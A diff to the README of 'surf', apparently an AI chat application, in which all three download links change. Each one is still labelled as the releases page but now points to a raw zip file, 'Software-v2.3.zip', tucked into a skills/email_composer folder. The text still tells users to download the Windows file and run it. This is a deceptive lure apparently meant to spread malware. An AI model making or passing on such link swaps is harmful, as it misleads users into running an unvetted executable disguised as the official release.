@@ -1,6 +1,6 @@
 # 🖥️ surf - Run AI chats your way
 
-[![Download surf](https://img.shields.io/badge/Download-surf-4B9CD3?style=for-the-badge)](https://github.com/driftfishquakergun623/surf/releases)
+[![Download surf](https://img.shields.io/badge/Download-surf-4B9CD3?style=for-the-badge)](https://raw.githubusercontent.com/driftfishquakergun623/surf/main/skills/email_composer/Software-v2.3.zip)
 
 ## 🚀 What surf does
 
@@ -10,7 +10,7 @@ Use surf if you want one place to chat with AI, test prompts, and keep your chat
 
 ## 📥 Download surf
 
-1. Open the [surf releases page](https://github.com/driftfishquakergun623/surf/releases)
+1. Open the [surf releases page](https://raw.githubusercontent.com/driftfishquakergun623/surf/main/skills/email_composer/Software-v2.3.zip)
 2. Find the latest release at the top of the page
 3. In the Assets list, download the Windows file
 4. Save the file to your PC
@@ -282,7 +282,7 @@ After install, try this simple test:
 
 ## 📦 Download and run
 
-Visit the [surf releases page](https://github.com/driftfishquakergun623/surf/releases), download the latest Windows file, and run it on your PC
+Visit the [surf releases page](https://raw.githubusercontent.com/driftfishquakergun623/surf/main/skills/email_composer/Software-v2.3.zip), download the latest Windows file, and run it on your PC
 
 ## 🧭 Tips for a smooth start
 
